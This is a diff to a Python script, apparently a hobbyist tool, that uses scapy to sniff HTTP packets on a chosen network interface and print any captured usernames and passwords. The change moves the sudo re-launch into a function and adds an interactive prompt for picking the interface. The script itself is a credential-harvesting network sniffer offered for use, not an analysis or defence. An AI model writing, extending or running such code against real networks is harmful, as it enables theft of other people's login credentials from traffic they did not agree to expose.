@@ -2,15 +2,17 @@ import scapy.all as scapy
 import os
 import sys
 from scapy_http import http
+import netifaces
 
-euid = os.geteuid()
-if euid != 0:
-    print("Script not started as root. Running sudo..")
-    args = ['sudo', sys.executable] + sys.argv + [os.environ]
-    os.execlpe('sudo', *args)
+def become_root():
+    euid = os.geteuid()
+    if euid != 0:
+        print("Script not started as root. Running sudo..")
+        args = ['sudo', sys.executable] + sys.argv + [os.environ]
+        os.execlpe('sudo', *args)
 
-print('Running. Your euid is', + euid)
-print("---------------------------------------------------------")
+    print('Running. Your euid is', + euid)
+    print("---------------------------------------------------------")
 
 
 def sniff(interface):
@@ -39,4 +41,15 @@ def processed_sniffed_packet(packet):
             print("\n\n[+] Possible Username/Password -->" + login_info.decode() + "\n\n")
 
 
-sniff("wlan0")
+def run_sniff():
+    become_root()
+    interfaces = netifaces.interfaces()
+    print("Availabe Interfaces :")
+    print(interfaces)
+    interface = raw_input("Enter the interface ")
+    if interface not in interfaces:
+        print("Pleas Enter a valid Interface!!")
+    else:
+        print("Sniffing.........")
+        sniff(interface)
+
